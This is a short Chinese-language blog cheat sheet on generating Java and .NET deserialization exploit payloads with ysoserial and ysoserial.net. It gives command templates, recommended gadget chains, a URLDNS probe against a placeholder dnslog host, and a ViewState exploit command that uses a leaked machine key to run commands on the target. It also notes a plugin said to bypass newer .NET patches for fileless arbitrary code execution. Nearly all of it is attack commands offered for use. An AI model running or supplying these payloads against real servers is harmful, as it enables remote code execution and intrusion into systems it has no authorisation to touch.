+++
date = '2026-04-10T23:50:39+08:00'
draft = false
title = 'Yso'
+++

## JAVA_YSO

##### 基础命令格式

```bash
java -jar ysoserial.jar [利用链] [执行的命令]

利用链: CommonsCollections1, URLDNS, Jackson 等
```

##### 探测/检测

如果不确定对方是否存在反序列化漏洞,或者不清楚使用了哪些依赖库可以使用`URLDNS`

```bash
java -jar ysoserial.jar URLDNS "http://your-dnslog-url.com"
```



注: 如果执行复杂命令最好封装成脚本执行,或者使用`sh -c`/`bash -c`



## .net_yso

基础命令

```bash
ysoserial.exe -g [Gadget] -f [Formatter] -c "[Command]" -o 编码

-g  利用链的名称,如TextFormattingRunProperties
-f  序列化类型,如 BinaryFormatter, Json.Net, ObjectStateFormatter
-c  执行的命令
-o  编码处理,如 raw ,bash64, urlencode
```

利用  (web Machinekey泄露)

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c echo pwned > C:\windows\temp\test.txt" --validationkey="你的KEY" --validationalg="SHA1"
```

技巧

`- p` 参数可以指定插件,对一些特定目标进行测试

```
-p ViewState：处理 ASP.NET ViewState。
-p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 
```

利用链:

```
场景/格式,            				推荐 Gadget,										说明
BinaryFormatter				TextFormattingRunProperties					通用性最强，成功率高
Json.NET					  ObjectDataProvider					   针对特定配置的 JSON 解析
XamlReader,					    ExpandedWrapper					   	   常用于 WPF 或特定 XML 处理
通用（高版本）				   ActivitySurrogateSelector				  配合插件可执行任意 C# 代码
```



------

“受限于个人水平，文中难免存在疏漏与错误。文笔粗浅、技术简陋，若有不足之处，恳请各位师傅批评指正，不吝赐教。感激不尽！”
